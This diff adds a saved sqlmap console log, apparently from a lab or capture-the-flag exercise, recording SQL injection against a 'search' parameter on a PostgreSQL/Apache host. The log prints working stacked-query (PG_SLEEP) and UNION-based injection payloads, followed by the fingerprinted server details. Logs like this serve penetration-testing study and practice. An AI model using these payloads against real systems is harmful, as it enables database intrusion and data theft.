@@ -1,0 +1,33 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.7#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:36:49 /2023-12-17/
+
+[17:36:49] [INFO] resuming back-end DBMS 'postgresql' 
+[17:36:49] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=hi';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: search=hi' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(106)||CHR(118)||CHR(113))||(CHR(84)||CHR(102)||CHR(119)||CHR(99)||CHR(82)||CHR(87)||CHR(102)||CHR(116)||CHR(97)||CHR(78)||CHR(107)||CHR(77)||CHR(81)||CHR(87)||CHR(106)||CHR(67)||CHR(78)||CHR(97)||CHR(120)||CHR(101)||CHR(88)||CHR(108)||CHR(116)||CHR(79)||CHR(97)||CHR(73)||CHR(103)||CHR(108)||CHR(117)||CHR(105)||CHR(83)||CHR(99)||CHR(71)||CHR(84)||CHR(99)||CHR(88)||CHR(117)||CHR(119)||CHR(86)||CHR(114))||(CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)),NULL-- JmOv
+---
+[17:36:49] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[17:36:49] [INFO] fetched data logged to text files under '/Users/luicrowie/.local/share/sqlmap/output/10.129.168.10'
+[17:36:49] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 17:36:49 /2023-12-17/
+
